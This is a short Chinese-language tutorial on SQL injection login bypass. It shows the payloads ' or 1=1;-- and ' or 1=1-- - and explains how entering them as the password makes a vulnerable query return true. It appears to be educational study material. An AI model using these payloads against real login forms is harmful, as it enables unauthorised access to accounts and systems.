# Blind SQLi
## SQL盲注

```
' or 1=1;--
或
’ or 1=1-- -
```

sql盲注用于一些我们看不到回显的登陆页面，我们得到很少甚至没有反馈来确认注入的查询是否真的成功，这是因为错误消息已被禁用，但是无论如何SQL注入仍然有效。

当我们看到这样的页面

![3082583-20230326114105703-2118916425](https://github.com/user-attachments/assets/e5d572a7-6044-43f2-adb7-b040a6f1cd1f)

而且url中没有？时，这种实际上相当于：

```
select * from users where username='%username%' and password='%password%' LIMIT 1;
```

这时我们可以尝试绕过身份验证

在Username下输入admin，在Password下输入 ’ or 1=1 ;--

这相当于：
```
select * from users where username='admin' and password='' or 1=1 ;--' LIMIT 1;
等于
select * from users where username='admin' and password='' or 1=1;
```

因为 1=1 是一个真正的陈述，并且我们使用了 OR 运算符， 这将始终导致查询返回为 true，这满足 数据库发现有效的 Web 应用程序逻辑 用户名/密码组合，并且应允许该访问。

最终我们便绕过了身份验证并登录
